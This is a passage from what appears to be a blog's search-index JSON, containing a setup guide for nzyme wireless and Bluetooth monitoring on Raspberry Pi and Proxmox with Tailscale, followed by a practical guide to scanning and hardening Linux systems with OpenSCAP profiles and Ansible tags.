can SSH in, and update all packages, perform a reboot, then confirm you can still SSH in.</p>"},{"location":"blog/2024/12/01/material-wifi-alert-nzyme-x-simple-raspberrypi-raspberry-pi--simple-proxmox-proxmox--simple-tailscale-tailscale/#wireless-drivers","title":"Wireless Drivers","text":"<p>If you're using an external card mentioned here in the nzyme documentation, you should already be able to see it with the following commands.</p> <pre><code>lsusb\nip link\n</code></pre> <p>You should see <code>wlan0</code> connected to your WiFi network of choice (or not if you're using an ethernet cable), and an <code>wlx00...</code> device. This is your wireless usb adapter. If you don't see it listed in the output of the above two commands, you'll need to check which drivers are available in the Ubuntu package repos for your card.</p> <p>If you can see your external wireless adapter, you can proceed.</p>"},{"location":"blog/2024/12/01/material-wifi-alert-nzyme-x-simple-raspberrypi-raspberry-pi--simple-proxmox-proxmox--simple-tailscale-tailscale/#nzyme-node","title":"nzyme-node","text":"<p>If your plan is to provision a node, with or without the tap, follow the steps here:</p> <ul> <li>Ubuntu 22.04</li> <li>Ubuntu 24.04</li> </ul> <p>Generally you're downloading and installing the deb file from GitHub's latest release, modifying the settings under <code>/etc/nzyme/nzyme.conf</code>, and starting the service.</p> <p>The only point worth mentioning here is, when it comes to Tailscale, set both:</p> <ul> <li><code>rest_listen_uri</code></li> <li><code>http_external_uri</code></li> </ul> <p>... to bind to your device's tailscale0 IP address if you want to lock access to the Tailnet. Otherwise bind to all interfaces with <code>0.0.0.0</code> and ensure the proper firewall rules are in place.</p>"},{"location":"blog/2024/12/01/material-wifi-alert-nzyme-x-simple-raspberrypi-raspberry-pi--simple-proxmox-proxmox--simple-tailscale-tailscale/#proxmox","title":"proxmox","text":"<p>Under Construction</p> <p>This section will be updated in the future after further testing.</p> <p>Generally you want:</p> <ul> <li>4 vCPU cores</li> <li>8 GB RAM</li> <li>32GB Storage</li> </ul>"},{"location":"blog/2024/12/01/material-wifi-alert-nzyme-x-simple-raspberrypi-raspberry-pi--simple-proxmox-proxmox--simple-tailscale-tailscale/#nzyme-tap","title":"nzyme-tap","text":"<p>Physical Hardware</p> <p>Unlike an nzyme-node without a tap, any tap provisioned must have some type of hardware involved. Even if you're passing through an external wireless adapter to a VM, you will need the adapter listening in the real world to send data to the node.</p> <p>This is why the Raspberry Pi is ideal to act as a tap, whether you have another Pi as a node, or a dedicated VM as a node.</p> <p>If you're interesting in fully virtualizing and testing nzyme, look at WiFi Challenge Lab which gives you a complete wireless environment to explore within a VM.</p> <p>Once the tap device is up and running, download and install the nzyme-tap deb package following these instructions:</p> <ul> <li>Ubuntu 22.04</li> <li>Ubuntu 24.04</li> </ul> <p>Next configure the lines referenced in <code>/etc/nzyme/nzyme-tap.conf</code>. As mentioned above in the nzyme-node seciton, point this to the Tailnet address of your nzyme-node if using Tailscale.</p> <p>Finally you may see that the service fails on the first start of <code>sudo systemctl start nzyme-tap</code>. What you'll want to do is modify the <code>wifi_interfaces</code> section of the /etc/nzyme/nzyme-tap.conf file to use what channels your external wireless adapter can see.</p> <p>In other words, this assumes the built-in wireless card (<code>wlan0</code>) is being used to connect to a WiFi AP for internet access. Of course if you're connected over ethernet, you could use both cards to monitor wrieless activity.</p> <p>To generate a list of channels and bands your device can listen on, do:</p> <pre><code>nzyme-tap --generate-channels\n</code></pre> <p>This will give you a configuration block that can be swapped in for the existing blocks under nzyme-tap.conf. You should add <code>channel_width_hopping_mode = \"full\"</code> which is a recommended default, to have something that looks like this in your conf file.</p> <pre><code>[wifi_interfaces.wlan1]\nactive = true\nchannel_width_hopping_mode = \"full\"\nchannels_2g = [&lt;list-of-channels&gt;]\nchannels_5g = [&lt;list-of-channels&gt;]\nchannels_6g = [&lt;list-of-channels&gt;]\n</code></pre> <p>Debugging with journalctl</p> <p>In my case I ran into an instance where even the generated channels list had a channel that didn't work when run as part of the nzyme-tap.conf file. Checking <code>sudo journalctl -xe</code> to see exactly what was wrong pointed to this channel not being understood by nzyme. Removing that channel from the config for that interface resulted in a successful start from nzyme-tap.</p> <p>After making these adjustments, <code>sudo systemctl restart nzyme-tap</code> should result in a successful run.</p>"},{"location":"blog/2024/12/01/material-wifi-alert-nzyme-x-simple-raspberrypi-raspberry-pi--simple-proxmox-proxmox--simple-tailscale-tailscale/#updating-nzyme","title":"Updating nzyme","text":"<p>The GitHub releases page (which points to https://github.com/nzymedefense/nzyme/releases) always has the latest update instructions for each verison.</p> <p>Update Process</p> <p>Generally, you want to upgrade your node first, then all your taps.</p> <p>To upgrade an nzyme-node:</p> <pre><code># As of 2.0.0-alpha.16\nsudo systemctl stop nzyme\nwget &lt;release-link&gt;\nsudo dpkg -i nzyme-node_[version].deb\nsudo nzyme --migrate-database\nsudo systemctl daemon-reload\nsudo systemctl start nzyme\n</code></pre> <p>To upgrade an nzyme-tap:</p> <pre><code>sudo systemctl stop nzyme-tap\nwget &lt;release-link&gt;\nsudo dpkg -i nzyme-tap_[version].deb\nsudo systemctl daemon-reload\nsudo systemctl start nzyme-tap\n</code></pre>"},{"location":"blog/2024/12/01/material-wifi-alert-nzyme-x-simple-raspberrypi-raspberry-pi--simple-proxmox-proxmox--simple-tailscale-tailscale/#configuring-nzyme","title":"Configuring nzyme","text":"<p>Resources Available</p> <p>It can't be overstated how useful the documentation, community forums, and the Discord Server are to search through for reference, as the platform grows and develops over time.</p> <p>There's also nzyme Connect, which is the free API to enrich your data with the following:</p> <ul> <li>MAC address vendor (OUI) information</li> <li>Bluetooth vendor and device information</li> <li>GeoIP and ASN information. (Powered by IPinfo.io)</li> <li>UAV (Unmanned Aerial Vehicle) model and classification information</li> </ul> <p>This API isn't enabled by default, and you need an account. nzyme doesn't collect any unique information. You can even inspect the code your local nzyme nodes are using the talk to the API. The API data is incredibly useful, especially for Bluetooth monitoring.</p>"},{"location":"blog/2024/12/01/material-wifi-alert-nzyme-x-simple-raspberrypi-raspberry-pi--simple-proxmox-proxmox--simple-tailscale-tailscale/#wifi-monitoring","title":"WiFi Monitoring","text":"<p>The value of this system comes from taking a few days to really configure monitoring for your location.</p> <p>This is done by defining your own assets first, starting with AP's, followed by clients. Then, observing what's \"normal\" for your local wireless traffic. In other words, neighboring devices and networks.</p> <p>All of this is detailed here, but it can be overwhelming initially based on the amount of alerts and data. The best way I have found to sort through the initial configuration:</p> <ul> <li>The majority of what you do will be under WiFi &gt; Monitoring<ul> <li>Add the SSIDs of your own devices to monitor under \"Monitored Networks\"</li> <li>Once you're under WiFi/Monitoring/Monitored Networks/Your Network, you can configure Alert Status and more</li> <li>Enable all alert types that make sense, if you have dynamic channel hopping configured, \"Expected Channels\" won't be useful</li> <li>You can use the \"Configure\" column to define things like Allowed Clients</li> <li>Define the BSSID (MAC) of your AP</li> <li>Define the cipher suites (pull those from the AP's info under WiFi &gt; Access Points &gt; <code>${MAC}</code> &gt; SSIDs &gt; <code>${SSID}</code>)</li> <li>Define the fingerprint, which is a hash of the device's unique details (the alert and the BSSID pages will have this)</li> </ul> </li> </ul> <p>From here you'll want to continue reviewing Alerts &gt; Overview and ensure you're not seeing any for your own AP's anymore. If there are any, work on those first.</p> <ul> <li>Check WiFi &gt; Monitoring &gt; SSIDs, \"approve\" your own assets, \"ignore\" any you see consistently and know about that aren't yours</li> <li>Check if WiFi &gt; Monitoring &gt; Monitored Networks shows all green (OK) under Status</li> </ul> <p>This should limit the types of alerts you're seeing once all assets are defined in nzyme. This is an ideal starting point.</p>"},{"location":"blog/2024/12/01/material-wifi-alert-nzyme-x-simple-raspberrypi-raspberry-pi--simple-proxmox-proxmox--simple-tailscale-tailscale/#bluetooth-monitoring","title":"Bluetooth Monitoring","text":"<p>Follow the documentation here. You're obtaining your bluetooth interface information with <code>hciconfig</code> similar to <code>ifconfig</code>. Ensure any bluetooth interfaces you want monitoring have their own block in <code>/etc/nzyme/nzyme-tap.conf</code>, same as each wireless interface.</p> <pre><code># Example\n&lt;SNIP&gt;\n[bluetooth_interfaces.hci0]\nactive = true\nbt_classic_enabled = true\nbt_le_enabled = true\ndiscovery_period_seconds = 30\ndbus_method_call_timeout_seconds = 2\n&lt;SNIP&gt;\n</code></pre> <p>Bluetooth still isn't working?</p> <p>You'll need to enable the bluetooth subsystem in three places for it to work: on the node itself at the system level, at the organization level, and at the tenant level.</p> <p>If you search the nzyme Discord for help with enabling bluetooth monitoring, for example you've set the appropriate changes in <code>/etc/nzyme/nzyme-tap.conf</code> (above) and still see something like the following in the journalctl or systemctl status logs:</p> <pre><code>[ERROR][2024-12-06 01:02:03][bluetooth::tables::bluetooth_table] Could not submit Bluetooth devices report: ...\n</code></pre> <p>...you'll find this post from the nzyme founder:</p> <p>You have to enable it for the organization first and then it should  be possible to enable it for the tenant as well</p> <p>To enable bluetooth for the Node at the system level:</p> <ul> <li>System &gt; Subsystems</li> <li>Here you'll see a subsystem settings pane where you can enable bluetooth</li> </ul> <p>To enable bluetooth at the Organization level:</p> <ul> <li>System &gt; Authentication &gt; Your-Organization-Name (Often \"Default Organization\")</li> <li>Choose \"Edit Organization\" on the top right</li> <li>Here you'll see a subsystem settings pane where you can enable bluetooth</li> </ul> <p>To enable bluetooth at the Tenant level:</p> <ul> <li>System &gt; Authentication &gt; Your-Organization-Name (Often \"Default Organization\")</li> <li>Under \"Tenants\" click on your Tenant (Often \"Default Tenant\")</li> <li>Choose \"Edit Tenant\" on the top right</li> <li>Here you'll see a subsystem settings pane where you can enable bluetooth</li> </ul>"},{"location":"blog/2024/12/01/material-wifi-alert-nzyme-x-simple-raspberrypi-raspberry-pi--simple-proxmox-proxmox--simple-tailscale-tailscale/#trilateration","title":"Trilateration","text":"<p>WiFi trilateration is described here. This allows you to visualize where wireless signals are appearing within a custom floorplan. You will need to create and upload the image file for the floorplan first.</p> <p>Some useful points if you're lost:</p> <p>Creating the Floorplan</p> <p>Both inkscape and GIMP are easy to install and effective at creating a basic floorplan quickly.</p> <p>You can do so using one of the sandboxed packaging frameworks:</p> <pre><code># If you use snap\nsudo snap install inkscape\n\n# If you use flatpak\nflatpak install --user https://flathub.org/repo/appstream/org.gimp.GIMP.flatpakref\n</code></pre> <p>AI Usage</p> <p>It's also easy enough for any of the AI tools to create a floorplan mock-up to use.</p> <p>Uploading a Floorplan</p> <ul> <li>System/Authentication &amp; Authorization/Organizations/Your Organization/Tenants/Your Tenant</li> <li>Choose \"Locations\"</li> <li>Create location</li> <li>Create a floor</li> <li>Upload the floorpan image file</li> </ul> <p>Assign Taps</p> <ul> <li>System/Authentication &amp; Authorization/Organizations/Your Organization/Tenants/Your Tenant</li> <li>Choose \"Taps\"</li> <li>Select a tap, and set the location</li> </ul> <p>Place Taps</p> <ul> <li>System/Authentication &amp; Authorization/Organizations/Your Organization/Tenants/Your Tenant</li> <li>Locations</li> <li>Your location</li> <li>Floors</li> <li>Your floor</li> <li>Drag and drop the taps around the floorplan</li> <li>Save and exit</li> </ul> <p>Where are the maps?</p> <p>To see the trilateration maps, you must go into the details of an AP or a client. Scroll down to see the new \"Physical Location / Trilateration\" section.</p> <p>Bug when rendering trilateration maps</p> <p>You may find after enabling this feature, the detailed information page for BSSID's (where the trilateration map will show) fails to load, or will load to a blank page.</p> <p>This is being tracked under Errors displaying BSSID Details page #1257.</p> <p>A work-around (as of the time of writing this) is to change the global filter at the top, so instead of \"All Taps\", only select the view from one tap, apply, and the pages should render again. If not, try refreshing and waiting for a 30-60 seconds.</p>"},{"location":"blog/2024/12/01/material-wifi-alert-nzyme-x-simple-raspberrypi-raspberry-pi--simple-proxmox-proxmox--simple-tailscale-tailscale/#going-forward","title":"Going Forward","text":"<p>Under Construction</p> <p>Sections to include in a future draft of this guide:</p> <ul> <li>Configure monitoring</li> <li>Additional automated provisioning of Raspberry Pi OS (Bookworm and later)</li> <li>Compiling arm64 tap packages for Ubuntu Server on Raspberry Pi</li> <li>Sending alerts to Discord and Slack from nzyme-nodes</li> <li>How to set log retention</li> <li>Possible SIEM integration (targeting Wazuh)</li> </ul>"},{"location":"blog/2024/05/29/material-file-document-arrow-right-openscap-practical-usage/","title":"OpenSCAP Practical Usage","text":"<p>Install OpenSCAP, pull compliance profiles from GitHub/ComplianceAsCode, debug policies with Ansible's <code>-C</code> and <code>-D</code> options, apply, test, and maintain policies with Ansible tags.</p>"},{"location":"blog/2024/05/29/material-file-document-arrow-right-openscap-practical-usage/#quickstart-demo","title":"Quickstart Demo","text":"<p>Start Here</p> <p>If you want to dive in before reading the details, clone the latest ansible-configs:</p> <pre><code>mkdir ~/src\ncd ~/src\ngit clone https://github.com/straysheep-dev/ansible-configs\ncd ansible-configs/inventory_openscap_utils\n</code></pre> <p>and follow the steps below.</p> <p>Run <code>./download-content.sh</code> to pull the latest OpenSCAP policy release from GitHub.</p> <p></p> <p>It will automatically <code>unzip</code> policy files matching the current OS. To specify another OS, use <code>-u &lt;os-name&gt;</code>.</p> <p></p> <p>You can list all available policy files with <code>-l</code>.</p> <p></p> <p>The wrapper script is written to interpret posix-extended regex. Combine rules from multiple policies like this.</p> <p></p> <p>Comment out any rules in the tags-*.txt files you don't want to apply, or find break the deployment.</p> <p></p> <p>Why Ansible?</p> <p>Running <code>./apply-tags.sh</code> with the <code>-d|--diff</code> options will run Ansible with <code>--check --diff</code>, showing you the changes without making them, and failing if a change cannot be made correctly. This is the strength of this approach. With states maintained as tags you can more easily isolate and debug what could have broken a system, especially if you're testing tags in groups.</p> <p>The wrapper script has built in <code>-h|--help</code> information. You can pass it all the arguments you will usually need to either test a policy on the localhost, or use an inventory + vault.</p> <p></p> <p>When the script executes a playbook, the raw command with all of the tags listed will be printed to your screen. This is copy / paste-able to repeat manually if necessary.</p> <p></p> <p>There are also folders in the same directory of premade tag sets that will apply as many rules as possible without breaking a system, exceptions being <code>aide</code> and <code>auditd</code> rules. The reason being these rules often endlessly loop, need tuned to your environment, or break the deployment. Use the <code>aide</code> and <code>install_auditd</code> roles instead.</p>"},{"location":"blog/2024/05/29/material-file-document-arrow-right-openscap-practical-usage/#intro","title":"Intro","text":"<p>Previously the best way I knew to customize a policy was through exporting a tailored profile through the SCAP Workbench GUI. This is easy to understand visually, but still required a number of steps to isolate and test small sets of rules at a time.</p> <p>Spending a lot of time working with Ansible, I learned about tags. SCAP content has strong Ansible support, including the use of tags. This effectively solved all of my problems.</p> <ol> <li>It was easy to apply a single rule, a set of related rules, types of rules, or a policy, which isolates changes effectively</li> <li>I could now take rules from different policies and apply them using a list of tags</li> <li>Ansible allows this to be done at scale, to different OS's</li> <li>Ansible's <code>-C</code> and <code>-D</code> options are invaluable for debugging, by showing changes ahead of time</li> </ol> <p>The second point was always the hurdle. Realistically you're using something like the standard system seurity profile or CIS L1 as a baseline, but you'd be missing out on some of the other benchmarks that provide a security benefit with minimal or no usability impact. Applying those profiles in full often completely breaks a system. With hundreds of rules, testing each one on each release used to be impossible to do. With tags you can apply whatever rules from whatever policy you want. This also means you can maintain lists of tags, and note which tags often have breaking changes.</p> <p>The fourth point (<code>-C</code> and <code>-D</code> options) made it possible to \"look ahead\" before applying a policy. Ansible will in many cases print exactly what's changing in what file without actually applying the policy. This makes it easy to see not just every change, but every change as it applies to your system.</p> <p>If you're new to SCAP, continue on. If you already know SCAP, and want to see how to use tags, jump to Ansible Tags and Test Policies via Tags.</p>"},{"location":"blog/2024/05/29/material-file-document-arrow-right-openscap-practical-usage/#references","title":"References","text":"<p>Much of the tool usage in guide has been copied or closely adapted from the examples in the official documentation. It's also meant to be a condensed view of how to set everything up.</p> <ul> <li>https://www.open-scap.org/</li> <li>OpenSCAP CLI<ul> <li>User Manual</li> <li>Dev Manual</li> </ul> </li> <li>OpenSCAP Workbench GUI</li> <li>Ansible Tags</li> </ul> <p>Security Profiles</p> <ul> <li>Latest source of XCCDF profiles, HTML guidelines, shell, Ansible, Puppet, and remediation scripts</li> <li>HTML rendered XCCDF profiles</li> <li>Profiles as lists for quick view</li> </ul>"},{"location":"blog/2024/05/29/material-file-document-arrow-right-openscap-practical-usage/#install-openscap-ansible","title":"Install OpenSCAP &amp; Ansible","text":"<p>See https://www.open-scap.org/download/ for all installation methods.</p> <p>The bare minumum to apply the compliance profiles requires a linux shell, and ideally Ansible depending on how you want to apply them. The OpenSCAP utlities are required to generate reports, custom profiles, and remediate system states. If you want a to take a modular approach like this guide recommends, you should be using Ansible.</p> <p>Both the CLI and GUI tool can accomplish the same thing. This guide will focus on the CLI tools.</p> <pre><code># Install OpenSCAP CLI tools\napt install libopenscap8                     # Debian/Ubuntu\ndnf install openscap-scanner                 # Fedora\nyum install openscap-scanner                 # CentOS\nyum install openscap-utils openscap-scanner  # RHEL\n\n# Install Scap Workbench GUI tool\nsudo dnf install scap-workbench              # Fedora\nsudo apt-get install scap-workbench          # Debian/Ubuntu =&lt;18.04\n\n# Install ansible\npython3 -m pip install --user ansible\n\n# Check oscap version\noscap --version\n</code></pre>"},{"location":"blog/2024/05/29/material-file-document-arrow-right-openscap-practical-usage/#get-the-security-profiles","title":"Get the Security Profiles","text":"<p>There are two main methods. On RedHat family systems these are available via your package manager. On Debian family systems, you should pull the latest release from GitHub for up to date policies.</p>"},{"location":"blog/2024/05/29/material-file-document-arrow-right-openscap-practical-usage/#package-manager","title":"Package Manager","text":"<p>Using your package manager to install the \"content\" (a.k.a. the SCAP profiles) is recommended.</p> <p>On RedHat / Fedora, this is called <code>scap-security-guide</code>.</p> <pre><code>sudo dnf install -y scap-security-guide\n</code></pre> <p>On Debian / Ubuntu, these files are named <code>ssg-*</code>. However these are often not available or very outdated. In this case, it's recommended to use the GitHub release archive.</p> <pre><code>apt install ssg-debian        # for Debian guides\napt install ssg-debderived    # for Debian-based distributions (e.g. Ubuntu) guides\napt install ssg-nondebian     # for other distributions guides (RHEL, Fedora, etc.)\napt install ssg-applications  # for application-oriented guides (Firefox, JBoss, etc.)\n</code></pre>"},{"location":"blog/2024/05/29/material-file-document-arrow-right-openscap-practical-usage/#github-release-archive","title":"GitHub Release Archive","text":"<p>The latest security profiles are always available at https://github.com/ComplianceAsCode/content/releases. Prebuilt versions are available as a <code>zip</code> archive, along with an accompanying sha512sum. The <code>tar.bz2</code> archive does not contain all of the bash and Ansible files for applying policies.</p> <p>This function is adapted from Bishop Fox's Sliver installer script, obtaining the latest release artifacts from the GitHub API, and downloading them into their own folder under <code>~/Downloads</code>.</p> <pre><code>#!/bin/bash\n\nfunction DownloadGitHubReleases() {\n\n    AUTHOR_REPO_LIST='ComplianceAsCode/content'\n\n    IGNORE_LIST='(tar\\.bz2)'\n\n    for AUTHOR_REPO in $AUTHOR_REPO_LIST\n    do\n        echo \"[&gt;] Creating ~/Downloads/$AUTHOR_REPO...\"\n        mkdir -p ~/Downloads/\"$AUTHOR_REPO\" &gt; /dev/null\n        ARTIFACTS=$(curl -s https://api.github.com/repos/\"$AUTHOR_REPO\"/releases/latest | awk -F '\"' '/browser_download_url/{print $4}')\n        for URL in $ARTIFACTS\n        do\n            ARCHIVE=$(basename \"$URL\")\n            if [[ ! \"$ARCHIVE\" =~ $IGNORE_LIST ]]; then\n                echo \"[*]Downloading $ARCHIVE...\"\n                curl --silent -L \"$URL\" --output ~/Downloads/\"$AUTHOR_REPO\"/\"$ARCHIVE\"\n            fi\n        done\n    done\n\n}\nDownloadGitHubReleases\n</code></pre> <p>The archive is 2GB uncompressed, so save space by extracting only the content relevant to your system.</p> <p>To extract all files for Ubuntu:</p> <pre><code># If you downloaded the zip file\nunzip -l scap-security-guide-0.1.72.zip                              # List files\nunzip scap-security-guide-0.1.72.zip *ubuntu*                        # Extract files\n\n# If you downloaded the tar file\ntar -tvjf scap-security-guide-0.1.72.tar.bz2                         # List files\ntar -xvjf scap-security-guide-0.1.72.tar.bz2 --wildcards '*ubuntu*'  # Extract files\n</code></pre> <p>If you wanted to only extract the data sources and Ansible playbooks relevant to your system:</p> <pre><code>source /etc/os-release\nunzip scap-security-guide-0.1.73.zip \"*ansible/$ID*\" \"*ssg-$ID*xml\"\n</code></pre> <p>The default location for SCAP profiles is <code>/usr/share/xml/scap/ssg/content/*.xml</code>. Assuming you're working from a dedicated host for SCAP scanning, it's fine to work from any directory where you've downloaded the GitHub release files. If you want to \"install\" them on your system, copy the xml profiles.</p> <pre><code>sudo mkdir -p /usr/share/xml/scap/ssg/content\nsudo cp scap-security-guide-0.1.73/*.xml -t /usr/share/xml/scap/ssg/content/\n</code></pre> <p>This is optional. With the profiles available you're ready to proceed.</p>"},{"location":"blog/2024/05/29/material-file-document-arrow-right-openscap-practical-usage/#review-security-profiles","title":"Review Security Profiles","text":"<p>There are a few ways to review the downlaoded security profiles.</p> <p>To import these policies into SCAP Workbench, see the documentation.</p> <p>You can extract the shell and Ansible files and review them with a text editor such as vim or VSCode:</p> <pre><code>code scap-security-guide-0.1.72/bash/ubuntu2204-script-standard.sh\n</code></pre> <p>With OpenSCAP installed, review the xml data stream which lists all available profiles with:</p> <pre><code>oscap info scap-security-guide-0.1.72/ssg-ubuntu2204-ds-1.2.xml\n</code></pre> <p>Example output of a SCAP data source:</p> <pre><code>ubuntu@ubuntu2204:~/Downloads/ComplianceAsCode/content$ oscap info scap-security-guide-0.1.72/ssg-ubuntu2204-ds.xml\nDocument type: Source Data Stream\nImported: 2024-02-09T04:43:43\n\nStream: scap_org.open-scap_datastream_from_xccdf_ssg-ubuntu2204-xccdf.xml\nGenerated: (null)\nVersion: 1.3\nChecklists:\n    Ref-Id: scap_org.open-scap_cref_ssg-ubuntu2204-xccdf.xml\n        Status: draft\n        Generated: 2024-02-09\n        Resolved: true\n        Profiles:\n            Title: CIS Ubuntu 22.04 Level 1 Server Benchmark\n                Id: xccdf_org.ssgproject.content_profile_cis_level1_server\n            Title: CIS Ubuntu 22.04 Level 1 Workstation Benchmark\n                Id: xccdf_org.ssgproject.content_profile_cis_level1_workstation\n            Title: CIS Ubuntu 22.04 Level 2 Server Benchmark\n                Id: xccdf_org.ssgproject.content_profile_cis_level2_server\n            Title: CIS Ubuntu 22.04 Level 2 Workstation Benchmark\n                Id: xccdf_org.ssgproject.content_profile_cis_level2_workstation\n            Title: Standard System Security Profile for Ubuntu 22.04\n                Id: xccdf_org.ssgproject.content_profile_standard\n        Referenced check files:\n            ssg-ubuntu2204-oval.xml\n                system: http://oval.mitre.org/XMLSchema/oval-definitions-5\n            ssg-ubuntu2204-ocil.xml\n                system: http://scap.nist.gov/schema/ocil/2\nChecks:\n    Ref-Id: scap_org.open-scap_cref_ssg-ubuntu2204-oval.xml\n    Ref-Id: scap_org.open-scap_cref_ssg-ubuntu2204-ocil.xml\n    Ref-Id: scap_org.open-scap_cref_ssg-ubuntu2204-cpe-oval.xml\nDictionaries:\n    Ref-Id: scap_org.open-scap_cref_ssg-ubuntu2204-cpe-dictionary.xml\n</code></pre> <p>Review further information about a profile using the unique <code>Id</code> obtained from the previous command with:</p> <pre><code>oscap info --profile &lt;Id&gt; /path/to/ssg.xml\n</code></pre> <p>Example output:</p> <pre><code>ubuntu@ubuntu2204:~/Downloads/ComplianceAsCode/content$ oscap info --profile xccdf_org.ssgproject.content_profile_standard scap-security-guide-0.1.72/ssg-ubuntu2204-ds.xml\nDocument type: Source Data Stream\nImported: 2024-02-09T04:43:43\n\nStream: scap_org.open-scap_datastream_from_xccdf_ssg-ubuntu2204-xccdf.xml\nGenerated: (null)\nVersion: 1.3\nProfile\n    Title: Standard System Security Profile for Ubuntu 22.04\n    Id: xccdf_org.ssgproject.content_profile_standard\n\n    Description: This profile contains rules to ensure standard security baseline of an Ubuntu 22.04 system. Regardless of your system's workload all of these checks should pass.\n</code></pre>"},{"location":"blog/2024/05/29/material-file-document-arrow-right-openscap-practical-usage/#evaluate-a-system","title":"Evaluate a System","text":"<p>Even without applying a policy, you can evaluate a system against any policy and generate a report in the form of XML and human readable HTML files. Effectively evaluating a system often requires root privileges.</p> <p>This is easier to read using variables. You can write this to a <code>scan.sh</code> file if it's easier.</p> <pre><code>#!/bin/bash\nresults_path='/path/to/results.xml'\nreport_path='/path/to/report.html'\nprofile_id='&lt;xccdf_org.ssgproject.content_profile_some_profile&gt;'\nssg_data_file='/path/to/&lt;ssg_data_file&gt;.xml'\noscap xccdf eval --profile \"$profile_id\" --results-arf \"$results_path\" --report \"$report_path\" \"$ssg_data_file\"\n</code></pre> <p>From the documentation:</p> <ul> <li><code>profile_id</code> The ID of an XCCDF profile, ID's are listed executing <code>oscap info &lt;ssg_data_file&gt;</code>, and typically start with <code>xccdf_org.ssgproject.content_profile_*</code></li> <li><code>results_path</code> The file path where the results in SCAP results data stream format (ARF) will be generated as an XML</li> <li><code>report_path</code> The file path where a report in HTML format will be generated</li> <li><code>ssg_data_file</code> The file path of the evaluated SCAP source data stream (These are in the root of the compliance as code releases, with XML file extensions)</li> </ul> <p>For example, to evaluate the <code>xccdf_org.ssgproject.content_profile_ospp profile</code> from the <code>/usr/share/xml/scap/ssg/content/ssg-rhel8-ds.xml</code> SCAP source data stream run this command:</p> <pre><code>results_path='/path/to/results.xml'\nreport_path='/path/to/report.html'\nprofile_id='xccdf_org.ssgproject.content_profile_ospp'\nssg_data_file='/usr/share/xml/scap/ssg/content/ssg-rhel8-ds.xml'\noscap xccdf eval --profile \"$profile_id\" --results-arf \"$results_path\" --report \"$report_path\" \"$ssg_data_file\"\n</code></pre> <p>The progress and results will be shown in the terminal. Full results are generated in <code>results.xml</code> as a SCAP data stream and an HTML report. The report is easily readable, and could even be saved as a PDF from the browser for your records.</p>"},{"location":"blog/2024/05/29/material-file-document-arrow-right-openscap-practical-usage/#remediate-a-system","title":"Remediate a System","text":"<p>There are two ways to remediate a system:</p> <ul> <li>Immediately after a scan, by adding <code>--remediate</code></li> <li>After scanning, use the results to generate a remediation script or playbook (\u2b50RECOMMENDED)</li> </ul> <p>If you just want to run all remediation steps (again, high chance of breaking your system), take the <code>bash</code> snippet from Evaluating a System above and add <code>--remediate</code> to it, for example:</p> <pre><code>oscap xccdf eval --remediate --profile &lt;SNIP&gt;\n</code></pre> <p>Instead if you prefer to generate a remediation file based on your scan (which is recommended), do the following.</p> <p>First after evaluating a system, get the metadata from your scan's results:</p> <pre><code>oscap info results.xml\n</code></pre> <p>You want the value of the <code>Result ID:</code>, for example: <code>xccdf_org.open-scap_testresult_xccdf_org.ssgproject.content_profile_standard</code>.</p> <p>Generate remediation files from that scan's results. There are multiple options for <code>--fix-type</code>.</p> <ul> <li><code>--fix-type bash</code></li> <li><code>--fix-type ansible</code></li> </ul> <p>You could even write this as <code>make-remediation.sh</code>. To create an Ansible remediation playbook:</p> <pre><code>#!/bin/bash\nresults_file='/path/to/results.xml'\nresult_id='&lt;xccdf_org.open-scap_testresult_xccdf_org.ssgproject.content_profile_name&gt;'\nfix_type='ansible'\nremediation_file='/path/to/playbook.yml'\noscap xccdf generate fix --fix-type \"$fix_type\" --output \"$remediation_file\" --result-id \"$result_id\" \"$results_file\"\n</code></pre>"},{"location":"blog/2024/05/29/material-file-document-arrow-right-openscap-practical-usage/#apply-a-policy","title":"Apply a Policy","text":"<p>IMPORTANT: As a reminder, In most cases it is better to scan a system, and generate a custom remediation playbook based on the system's current state. Jump to Ansible Tags and Test Policies via Tags for a modular approach to testing policies by using tags.</p> <p>All policies have shell scripts and Ansible playbooks available to apply them. You should be applying these policies as root, either through <code>sudo</code>, as <code>root</code> itself, or through some other elevation mechanism like Ansible's <code>-b</code>, <code>--ask-become-pass</code>, or <code>ansible_become_password: {{ &lt;sudo-password&gt; }}</code> in a vault file.</p> <p>The downside to using bash scripts is you cannot specify tags, limiting what steps in the script to apply. Apart from bash scripts being potentially harder to maintain and scale, Ansible has the <code>-C</code> and <code>-D</code> options to show what will change before applying the policy.This is invaluable for testing and validating remediation scripts. Only Ansible can use tags.</p> <p>Apply a prebuilt policy using <code>bash</code> (highest chance of breaking a system) or a remediation policy (also high chance of breaking systems without testing):</p> <pre><code>sudo bash ./scap-security-guide-0.1.73/bash//ubuntu2004-script-standard.sh\nsudo bash ./path/to/remediation.sh\n</code></pre> <p>Apply a policy using Ansible. One again, highlighting the use of tags.</p> <pre><code>ansible-playbook -i \"localhost,\" -c local playbook.yml                                          # as root\nansible-playbook -i \"localhost,\" -c local -b --ask-become-pass playbook.yml                     # using sudo\nansible-playbook -i \"localhost,\" -c local -b --ask-become-pass playbook.yml  --tags tag1,tag2   # using tags\n</code></pre> <p>NOTE: Some playbooks on Debian based systems will fail due to the line <code>set -o pipefail</code> in tasks using <code>ansible.builtin.shell</code>. This is because <code>sh</code> defaults to <code>dash</code> on Debian based systems, and <code>dash</code> has no support for pipefail.</p> <p>An easy work around for this can be made at the top of the Ansible playbook file, by adding <code>ansible_shell_executable: /bin/bash</code> under <code>vars:</code>.</p> <pre><code>&lt;SNIP&gt;\n- name: Ansible Playbook for xccdf_org.ssgproject.content_profile_standard\n  hosts: all\n  vars:\n    ansible_shell_executable: /bin/bash\n&lt;SNIP&gt;\n</code></pre>"},{"location":"blog/2024/05/29/material-file-document-arrow-right-openscap-practical-usage/#ansible-tags","title":"Ansible Tags","text":"<p>To use tags, they must be included on the CLI with <code>--tags tag1,tag2...</code>, otherwise this won't work effectively given that each prebuilt Ansible file is a self contained playbook. You would need to modify that playbook to be a task file, and any manual modification of the SCAP content is what we're trying to avoid by using tags.</p> <p>Benefits of using tags:</p> <ul> <li>SCAP playbooks tag every task with its rule name</li> <li>Maintain a list of tags instead of code, profiles, or complex scripts</li> <li>Repeatability, portability between profiles and OS's</li> <li>Easier to modify, debug, and create a \"state\" for a system</li> <li>Use one list of tags with multiple profiles</li> <li>If a tag is missing or not present in the playbook, that tag is basically ignored. All other tags still present will execute.</li> </ul> <p>With OpenSCAP content, every task in every playbook is \"tagged\", meaning exactly what it implies; here's an example task:</p> <pre><code>    - name: Comment out any occurrences of kernel.randomize_va_space from config files\n      replace:\n        path: '{{ item.path }}'\n        regexp: 